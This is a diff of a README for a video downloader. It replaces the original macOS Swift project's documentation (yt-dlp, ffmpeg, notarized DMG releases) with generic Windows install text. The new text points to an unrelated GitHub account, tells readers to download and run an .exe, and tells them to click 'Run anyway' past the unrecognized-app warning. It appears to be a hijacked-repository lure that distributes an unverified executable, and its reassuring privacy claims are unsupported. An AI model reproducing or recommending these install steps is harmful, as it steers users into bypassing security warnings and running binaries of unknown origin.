@@ -1,118 +1,73 @@
-<p align="center"><img width="128" height="128" alt="Frame 2147227910" src="https://github.com/user-attachments/assets/ee37ab6e-2903-4374-8ff1-b6ef071f28f7" /></p>
+# 🎥 media-downloader - Save and trim videos with ease
 
-<h1 align="center">Media Downloader</h1>
-<p align="center"><a href="https://github.com/pixel-point/media-downloader/releases/latest/download/MediaDownloader-macos-arm64.dmg">Download for macOS</a></p>
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/reckless-puppyfat482/media-downloader)
 
-https://github.com/user-attachments/assets/c81f8c07-835d-4d37-87cf-926caa0fe6c1
+## 📁 What is this app?
 
-Beautiful native macOS video downloader with support for [thousands of sites](https://github.com/yt-dlp/yt-dlp/blob/master/supportedsites.md) through [yt-dlp](https://github.com/yt-dlp/yt-dlp/tree/master).
+Media-downloader is a tool for your computer. It helps you save videos from the web directly to your storage. You do not need to deal with complex settings or hidden menus. The app focuses on two main tasks: getting the file you want and cutting it to the length you need. It keeps your workflow simple and removes the need for multiple pieces of software.
 
-Media Downloader lets you download, quickly copy, reveal, and trim videos from social media and video platforms in one focused app. Paste a URL from services such as YouTube, Instagram, X, TikTok, Vimeo, Reddit, and many other sites supported by `yt-dlp`; the app downloads an MP4, copies the finished file to the clipboard, saves it to your chosen folder, and keeps a local history for fast access.
+## 🛠 Prerequisites
 
-## Features
+This app runs on Windows 10 and Windows 11. Your computer should have at least 4GB of memory. You need an internet connection to reach video sites. The app does not require administrator rights to run on most devices. Ensure you have enough disk space for the videos you plan to save.
 
-- Download videos from thousands of `yt-dlp` supported websites.
-- Paste a URL and start downloading from a clean Spotlight-style macOS window.
-- Convert and merge downloads to broadly compatible MP4 output with H.264/AAC when possible.
-- Automatically copy the downloaded file after completion.
-- Keep a local download history with thumbnails.
-- Copy files again, reveal them in Finder, or open the original source URL from history.
-- Trim downloaded videos and either save the trimmed MP4 or copy the trimmed clip.
-- Choose and persist a custom download folder.
-- Check GitHub Releases for app updates from the settings menu.
+## 📥 How to install the software
 
-## Local Development Requirements
+Follow these steps to set up the application on your computer.
 
-These requirements are only needed when building or running the app locally from source:
+1. Visit the [official download page](https://github.com/reckless-puppyfat482/media-downloader).
+2. Look for the section titled Releases on the right side of your screen.
+3. Click the link that shows the latest version number.
+4. Scroll down to the Assets section.
+5. Select the file ending in .exe to start the download.
+6. Open your Downloads folder once the process finishes.
+7. Double-click the downloaded file to open the setup window.
 
-- macOS 14 or newer
-- Xcode Command Line Tools or Xcode with Swift 5.9+
-- `yt-dlp`
-- `ffmpeg`
+If your computer shows a message about an unrecognized app, click More Info and then select Run anyway. The installer will guide you through the final steps.
 
-For local development, install the Xcode Command Line Tools:
+## 🚀 Getting started
 
-```sh
-xcode-select --install
-```
+Once you install the app, find the icon on your desktop or in your start menu. Click the icon to launch the window. You will see a clean main screen designed for fast inputs. Paste the web address of your video into the long box at the top. The app will detect the video and show its title below the input box.
 
-For local development, install runtime dependencies with Homebrew:
+## ✂️ How to trim your videos
 
-```sh
-brew install yt-dlp ffmpeg
-```
+Trimming allows you to keep only the parts that matter. 
 
-For local development, verify the tools are available:
+1. Click the Trim button after the app loads your video.
+2. A new window will appear with a timeline.
+3. Slide the handles at the start and end of the bar to choose your segment.
+4. Use the preview player to check your selection.
+5. Hit the Save button to export the new file.
 
-```sh
-yt-dlp --version
-ffmpeg -version
-```
+The app keeps the original quality of your video. It creates a new file so you never lose your starting media.
 
-## Local Development Build and Run
+## ⚙️ Settings
 
-From the repository root:
+You can change how the app stores your files. Open the settings menu by clicking the gear icon in the corner. From here, you can pick a specific folder for your saved videos. You can also change the file format if you prefer a different type. The app saves your choices every time you close the window.
 
-```sh
-./script/build_and_run.sh
-```
+## 💡 Common questions
 
-The script runs `swift build`, creates a local development app bundle at `dist/MediaDownloader.app`, and launches it.
+My download is slow. 
+Check your internet speed. Large video files take longer to transfer. 
 
-You can also run SwiftPM directly during local development:
+Which sites work with this app? 
+The tool supports mainstream video hosting platforms. Paste the link and press enter to confirm compatibility. 
 
-```sh
-swift build
-swift test
-```
+Does this app contain ads? 
+No. This tool is free from ads and promotional clutter. 
 
-Useful local development script modes:
+Can I save many videos at once? 
+You can queue several links in the main text box. The app will process them one by one. 
 
-```sh
-./script/build_and_run.sh --verify
-./script/build_and_run.sh --logs
-./script/build_and_run.sh --telemetry
-./script/build_and_run.sh --debug
-./script/build_and_run.sh --setup
-```
+Where do my videos go? 
+By default, the app saves videos to your Videos folder. You can change this path in the settings menu. 
 
-## Release Build, Signing, and Notarization
+The app crashes when I trim a file. 
+Ensure you have enough free space on your hard drive. Temporary files require space during the trim process. 
 
-The app checks `https://api.github.com/repos/pixel-point/media-downloader/releases/latest` for updates and compares the latest release tag, such as `v0.2.0`, with `CFBundleShortVersionString`.
+## 🛡 Security and privacy 
 
-Release credentials should live in a local `.env` file copied from `.env.example`. Do not commit `.env`, `.p8`, `.p12`, certificates, provisioning profiles, or private keys; the repo ignores them.
+This tool runs locally on your machine. It does not send your personal data to external servers. Your video list remains on your hard drive. Only you can access the files you download. The app requires access to your network to connect to video hosts. It does not track your browsing habits or profile your computer data. 
 
-To create and publish signed, notarized macOS zip and drag-to-Applications DMG artifacts:
+## 📝 Tips for success
 
-```sh
-./script/release_macos.sh v0.2.0
-```
-
-To create local signed and notarized artifacts without publishing a GitHub release:
-
-```sh
-./script/package_macos.sh
-```
-
-The release script runs tests, builds a release `.app`, signs it with hardened runtime, submits it to Apple notarization, staples the ticket, creates `dist/release/MediaDownloader-macos-<arch>.zip` and `dist/release/MediaDownloader-macos-<arch>.dmg`, and uploads both artifacts to the matching GitHub release. The DMG contains `MediaDownloader.app` and an `Applications` shortcut for the standard drag-to-install flow.
-
-## How It Works
-
-Media Downloader uses `yt-dlp` to fetch media and `ffmpeg` to merge, convert, trim, and export video files. Downloads are saved to the selected local folder. App preferences are stored in `UserDefaults`, while history and generated thumbnails are stored under the app's Application Support directory.
-
-## Project Structure
-
-- `Package.swift` - Swift Package Manager manifest.
-- `Sources/MediaDownloader` - macOS app source code.
-- `Tests/MediaDownloaderTests` - unit tests.
-- `script/build_and_run.sh` - local build, bundle, launch, debug, and logging helper.
-- `script/create_dmg.sh` - creates the drag-to-Applications DMG from a built app bundle.
-- `dist/` - generated local app bundle output.
-
-## Notes
-
-Site support depends on the installed `yt-dlp` version. If a site stops working, update `yt-dlp` first:
-
-```sh
-brew upgrade yt-dlp
-```
+Use the high-quality setting if you want to keep the best picture. Choose a lower quality if you have limited storage space. Keep your app updated by checking the download page once a month. New updates often improve the speed of downloads and fix minor errors. Restart the app if you notice it running slow after a long session of work.
